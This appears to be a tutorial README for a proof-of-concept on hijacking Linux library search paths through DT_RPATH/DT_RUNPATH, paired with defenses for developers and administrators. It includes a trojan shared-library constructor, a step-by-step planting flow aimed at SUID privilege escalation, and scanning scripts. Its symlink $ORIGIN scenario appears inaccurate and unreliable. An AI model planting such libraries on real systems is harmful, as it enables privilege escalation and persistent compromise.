# Part 4: DT_RPATH/DT_RUNPATH Exploitation - Hijacking Library Search Paths

## Overview

DT_RPATH and DT_RUNPATH are entries embedded in ELF binaries that specify directories where the dynamic linker should search for shared libraries. When these paths point to user-writable locations, an attacker can place malicious libraries that get loaded instead of legitimate ones.

This is a **passive attack** - once the malicious library is in place, the victim program loads it automatically every time it runs.

---

## The Problem: Where Does ld.so Find Libraries?

When a program needs `libhelper.so`, the dynamic linker searches multiple locations in a specific order. The RPATH/RUNPATH embedded in the binary influences this search order.

---

## Library Search Order

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    DYNAMIC LINKER SEARCH ORDER                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ 1. DT_RPATH (if DT_RUNPATH is NOT set)                            │  │
│  │    • Embedded in binary at compile time                          │  │
│  │    • Searched BEFORE LD_LIBRARY_PATH (dangerous!)                 │  │
│  │    • Legacy, but still commonly used                              │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                              ↓                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ 2. LD_LIBRARY_PATH (environment variable)                         │  │
│  │    • User-controlled                                              │  │
│  │    • Ignored for SUID/SGID binaries (AT_SECURE)                   │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                              ↓                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ 3. DT_RUNPATH (if set, DT_RPATH is ignored)                       │  │
│  │    • Modern replacement for DT_RPATH                              │  │
│  │    • Searched AFTER LD_LIBRARY_PATH (safer)                       │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                              ↓                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ 4. /etc/ld.so.cache                                               │  │
│  │    • Cached paths from ldconfig                                   │  │
│  │    • Fast lookup for common libraries                             │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                              ↓                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ 5. Default paths (/lib, /usr/lib, etc.)                           │  │
│  │    • System library directories                                   │  │
│  │    • Last resort                                                  │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## DT_RPATH vs DT_RUNPATH

### The Critical Difference

```
                    DT_RPATH                         DT_RUNPATH
              ┌─────────────────┐              ┌─────────────────┐
              │  Searched FIRST │              │ Searched THIRD  │
              │  (before env)   │              │ (after env)     │
              └────────┬────────┘              └────────┬────────┘
                       │                                │
         ┌─────────────┼─────────────┐    ┌─────────────┼─────────────┐
         ▼             ▼             ▼    ▼             ▼             ▼
    ┌─────────┐  ┌───────────┐  ┌─────┐  ┌───────────┐  ┌─────────┐  ┌─────┐
    │ RPATH   │  │LD_LIB_PATH│  │ ... │  │LD_LIB_PATH│  │ RUNPATH │  │ ... │
    │ ★FIRST★ │  │  second   │  │     │  │  ★FIRST★  │  │ second  │  │     │
    └─────────┘  └───────────┘  └─────┘  └───────────┘  └─────────┘  └─────┘

    DT_RPATH is MORE DANGEROUS because user cannot override it with
    LD_LIBRARY_PATH to load a different (safe) library version!
```

### How to Set Each

```bash
# Set DT_RPATH (legacy, dangerous)
gcc -Wl,-rpath,/path/to/libs -Wl,--disable-new-dtags -o binary source.c

# Set DT_RUNPATH (modern, safer)
gcc -Wl,-rpath,/path/to/libs -Wl,--enable-new-dtags -o binary source.c

# Check which is set
readelf -d binary | grep -E "RPATH|RUNPATH"
```

---

## The $ORIGIN Token

`$ORIGIN` is a special token that expands to the directory containing the executable.

```
Binary at: /opt/app/bin/myprogram
RPATH:     $ORIGIN/../lib

Expands to: /opt/app/lib
```

### $ORIGIN Exploitation Scenarios

```
SCENARIO 1: Symlink Attack
─────────────────────────────────────────────────────────────────────────

  Original setup:
    /opt/app/bin/program     (RPATH = $ORIGIN/../lib)
    /opt/app/lib/libfoo.so   (legitimate library)

  Attack:
    1. Create symlink: /tmp/evil/bin/program → /opt/app/bin/program
    2. Create:         /tmp/evil/lib/libfoo.so (malicious)
    3. Run:            /tmp/evil/bin/program

    $ORIGIN now resolves to /tmp/evil/bin
    Library loaded from /tmp/evil/lib/libfoo.so (attacker-controlled!)


SCENARIO 2: Binary in Writable Directory
─────────────────────────────────────────────────────────────────────────

  Setup:
    /home/user/app/program    (RPATH = $ORIGIN/libs)
    /home/user/app/libs/      (doesn't exist yet)

  Attack:
    1. Create: /home/user/app/libs/libfoo.so (malicious)
    2. Run:    /home/user/app/program

    Library loaded from attacker-controlled directory!
```

---

## Vulnerable RPATH Patterns

### Pattern 1: World-Writable Directory

```c
/* Compiled with: -Wl,-rpath,/tmp/libs */

DT_RPATH: /tmp/libs

Attack: Place malicious library in /tmp/libs/
Risk:   HIGH - /tmp is world-writable
```

### Pattern 2: User-Writable Directory

```c
/* Compiled with: -Wl,-rpath,/home/user/myapp/libs */

DT_RPATH: /home/user/myapp/libs

Attack: If attacker has access to user's home directory
Risk:   MEDIUM - requires user-level access
```

### Pattern 3: Non-Existent Directory

```c
/* Compiled with: -Wl,-rpath,/opt/custom/libs */
/* But /opt/custom/libs doesn't exist */

DT_RPATH: /opt/custom/libs (non-existent)

Attack: Create the directory and place malicious library
Risk:   MEDIUM - requires write access to parent (/opt/custom)
```

### Pattern 4: Relative Path

```c
/* Compiled with: -Wl,-rpath,./libs */

DT_RPATH: ./libs (relative to CWD!)

Attack: Run from directory where attacker controls ./libs/
Risk:   HIGH - depends on current working directory
```

---

## The Attack Flow

```
                            EXPLOITATION FLOW

    ┌──────────────────────────────────────────────────────────────────┐
    │ 1. RECONNAISSANCE                                                │
    │    Find binary with vulnerable RPATH/RUNPATH                     │
    │                                                                  │
    │    $ readelf -d /path/to/binary | grep -E "RPATH|RUNPATH"        │
    │    0x000000000000001d (RUNPATH) Library runpath: [/tmp/libs]     │
    │                                                      ↑           │
    │                                              EXPLOITABLE!        │
    └───────────────────────────────┬──────────────────────────────────┘
                                    │
                                    ▼
    ┌──────────────────────────────────────────────────────────────────┐
    │ 2. IDENTIFY NEEDED LIBRARIES                                     │
    │                                                                  │
    │    $ readelf -d /path/to/binary | grep NEEDED                    │
    │    0x0000000000000001 (NEEDED) Shared library: [libhelper.so]    │
    │                                                                  │
    │    $ ldd /path/to/binary                                         │
    │    libhelper.so => /opt/app/libs/libhelper.so                    │
    └───────────────────────────────┬──────────────────────────────────┘
                                    │
                                    ▼
    ┌──────────────────────────────────────────────────────────────────┐
    │ 3. CREATE MALICIOUS LIBRARY                                      │
    │                                                                  │
    │    // evil_libhelper.c                                           │
    │    __attribute__((constructor))                                  │
    │    void pwn(void) {                                              │
    │        // Malicious code here                                    │
    │        system("id > /tmp/pwned");                                │
    │    }                                                             │
    │                                                                  │
    │    // Export same symbols as original                            │
    │    int process_data(const char *d) { return strlen(d); }         │
    │                                                                  │
    │    $ gcc -shared -fPIC -o libhelper.so evil_libhelper.c          │
    └───────────────────────────────┬──────────────────────────────────┘
                                    │
                                    ▼
    ┌──────────────────────────────────────────────────────────────────┐
    │ 4. PLACE IN RPATH DIRECTORY                                      │
    │                                                                  │
    │    $ cp libhelper.so /tmp/libs/                                  │
    │                                                                  │
    │    Directory structure:                                          │
    │    /tmp/libs/                                                    │
    │    └── libhelper.so   ← Our malicious library                    │
    └───────────────────────────────┬──────────────────────────────────┘
                                    │
                                    ▼
    ┌──────────────────────────────────────────────────────────────────┐
    │ 5. WAIT FOR EXECUTION                                            │
    │                                                                  │
    │    When victim runs the binary:                                  │
    │    $ /path/to/binary                                             │
    │                                                                  │
    │    ld.so search order:                                           │
    │    1. /tmp/libs/libhelper.so  ← FOUND! (our malicious library)   │
    │    2. (never reaches legitimate library)                         │
    │                                                                  │
    │    Result: Our constructor() runs with victim's privileges!      │
    └──────────────────────────────────────────────────────────────────┘
```

---

## Comparison: RPATH vs Other Techniques

| Aspect | DT_RPATH | LD_PRELOAD | GOT Hijacking |
|--------|----------|------------|---------------|
| **Trigger** | Program start | Program start | Runtime |
| **Requires** | Write to RPATH dir | Set env var | Memory write |
| **Persistence** | Until lib removed | Per-execution | Per-execution |
| **SUID Impact** | Still works! | Blocked (AT_SECURE) | Depends on RELRO |
| **Detection** | Check RPATH + directory | Check env | Monitor GOT |

### Key Advantage of RPATH Exploitation

```
╔══════════════════════════════════════════════════════════════════════╗
║  RPATH EXPLOITATION WORKS ON SUID BINARIES!                          ║
║                                                                      ║
║  Unlike LD_PRELOAD which is blocked by AT_SECURE for SUID programs,  ║
║  DT_RPATH is embedded in the binary and always honored.              ║
║                                                                      ║
║  If a SUID binary has RPATH pointing to a user-writable directory,   ║
║  it's a privilege escalation vulnerability!                          ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Finding Vulnerable Binaries

### Manual Search

```bash
# Find all ELF binaries with RPATH/RUNPATH
find /usr -type f -executable -exec sh -c '
    readelf -d "$1" 2>/dev/null | grep -qE "RPATH|RUNPATH" && echo "$1"
' _ {} \;

# Check if RPATH points to writable directory
for bin in $(find /usr -type f -executable 2>/dev/null); do
    rpath=$(readelf -d "$bin" 2>/dev/null | grep -E "RPATH|RUNPATH" | awk -F'[][]' '{print $2}')
    if [ -n "$rpath" ]; then
        for path in $(echo "$rpath" | tr ':' '\n'); do
            if [ -w "$path" ] 2>/dev/null; then
                echo "VULNERABLE: $bin -> $path"
            fi
        done
    fi
done
```

### Using the Scanner

```bash
# Scan a specific binary
./rpath_scanner /path/to/binary

# Scan multiple binaries
./rpath_scanner /usr/bin/* 2>/dev/null | grep -A5 "VULNERABLE"
```

---

## Real-World Examples

### CVE Examples with RPATH Issues

1. **Oracle products** - Historically shipped with RPATH pointing to user-writable directories

2. **Custom enterprise software** - Often compiled with development RPATH left in production builds

3. **Third-party installers** - May create RPATH pointing to `/opt/appname/lib` with wrong permissions

### Common Vulnerable Patterns

```bash
# Development leftover
RPATH: /home/developer/project/libs

# World-writable temp directory
RPATH: /tmp/application/libs

# $ORIGIN with writable parent
RPATH: $ORIGIN/../lib  (when binary is in user-writable location)

# Non-existent path with writable parent
RPATH: /opt/myapp/lib  (when /opt/myapp doesn't exist but /opt is writable)
```

---

## Defenses

### For Developers

1. **Use RUNPATH instead of RPATH**
   ```bash
   gcc -Wl,--enable-new-dtags -Wl,-rpath,/path/to/libs program.c
   ```

2. **Use absolute paths to system directories only**
   ```bash
   gcc -Wl,-rpath,/usr/lib/myapp program.c
   ```

3. **Remove RPATH in production builds**
   ```bash
   # Check for RPATH
   readelf -d binary | grep -E "RPATH|RUNPATH"

   # Remove with patchelf
   patchelf --remove-rpath binary
   ```

4. **Set correct directory permissions**
   ```bash
   chmod 755 /path/to/libs  # Not world-writable!
   chown root:root /path/to/libs
   ```

### For System Administrators

1. **Scan for vulnerable binaries regularly**
   ```bash
   ./rpath_scanner /usr/bin/* /usr/local/bin/* /opt/*/bin/*
   ```

2. **Monitor RPATH directories for new files**
   ```bash
   inotifywait -m /suspicious/rpath/dir
   ```

3. **Use security tools**
   ```bash
   # checksec shows RPATH
   checksec --file=/path/to/binary
   ```

---

## Files in This POC

| File | Description |
|------|-------------|
| `libhelper.c` | Legitimate helper library |
| `evil_libhelper.c` | Malicious trojan library |
| `victim.c` | Target program that loads libhelper |
| `rpath_scanner.c` | Utility to find vulnerable binaries |
| `Makefile` | Build various RPATH scenarios |

## Building and Running

```bash
# Build all components
make all

# Run full demonstration
make demo

# Scan the vulnerable binaries
make scan

# Show RPATH values
make show-rpath

# Show library search order
make search-order

# Clean up
make clean
```

---

## Key Takeaways

1. **DT_RPATH is searched before LD_LIBRARY_PATH** - Makes it dangerous as users can't override with environment variables

2. **RPATH works on SUID binaries** - Unlike LD_PRELOAD, RPATH is always honored, making it a potential privilege escalation vector

3. **Passive persistence** - Once malicious library is placed, it's loaded every time the program runs

4. **$ORIGIN can be exploited** - If attacker can control where the binary is run from (symlinks, CWD)

5. **Non-existent directories are dangerous** - If RPATH points to a directory that doesn't exist but can be created

6. **Use RUNPATH instead of RPATH** - RUNPATH is searched after LD_LIBRARY_PATH, allowing users to override
